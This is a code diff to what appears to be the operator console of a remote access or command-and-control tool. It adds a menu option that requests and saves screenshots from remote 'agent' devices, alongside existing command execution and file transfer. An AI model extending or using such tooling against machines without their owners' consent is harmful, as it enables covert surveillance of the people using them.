@@ -126,7 +126,42 @@ def request_file_download(target, remote_filepath):
         }
     )
 
-    
+
+# Screenshot handling
+
+@sio.event
+def screenshot_result(data):
+
+    try:
+        time.sleep(0.5)
+        if data["status"] == "error":
+            print("\n----------SCREENSHOT ERROR----------")
+            print(
+                f"ERROR: {data['message']}"
+            )
+            print("--------------------\n")
+            return
+
+        path = (
+            FileManager.save_screenshot(
+                data["image_data"] # Changed from "image" to "image_data"
+            )
+        )
+
+        print("\n----------SCREENSHOT SAVED----------")
+        print(f"Screenshot saved to: {path}")
+        print("--------------------\n")
+    finally:
+        operation_finished.set()
+
+
+def request_screenshot( target ):
+    sio.emit(
+        "screenshot",
+        {
+            "target": target
+        }
+    )
 
 # menu
 
@@ -144,7 +179,8 @@ try:
         print("2. Execute Command")
         print("3. File Transfer")
         print("4. Download File")
-        print("5. Exit")
+        print("5. Request Screenshot")
+        print("6. Exit")
         choice = input("Choice: ")
 
         if choice == "1":
@@ -216,10 +252,25 @@ try:
                 if another not in ['y', 'yes']:
                     break
             time.sleep(1)
-        
-        # Exit
+            
+        # Request Screenshot
         
         elif choice == "5":
+            
+            target = input("Target Device ID : ")
+            if not is_agent_available(target):
+                continue
+            
+            print("--> Requesting screenshot...")
+            operation_finished.clear()
+            request_screenshot(target)
+            print("--> Waiting for screenshot...")
+            operation_finished.wait()
+            time.sleep(1)
+        
+        # Exit (Corrected choice from 5 to 6)
+        
+        elif choice == "6":
             
             print("Disconnecting...")
             time.sleep(0.5)
